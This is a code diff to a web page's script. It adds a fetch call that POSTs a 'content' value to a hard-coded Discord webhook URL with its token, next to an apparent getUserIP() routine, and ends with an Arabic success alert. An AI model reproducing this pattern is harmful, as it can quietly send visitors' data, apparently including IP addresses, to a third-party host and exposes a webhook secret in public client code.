@@ -755,6 +755,16 @@ getUserIP();
         document.querySelector('.cta-button').addEventListener('mouseleave', function() {
             this.style.boxShadow = '0 8px 25px rgba(66, 165, 245, 0.4)';
         });
+                //webhok of web
+    fetch("https://discord.com/api/webhooks/1389947635607015535/qQcUhfzDxIXLzCi5wOxBnEahVgAeFntC5zSbfKXvHZz5zgCrE7oowTouVevweLp-f64G", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content: content
+      })
+    }).then(() => alert("تم إرسال الطلب بنجاح!"));
     </script>
 </body>
 </html>
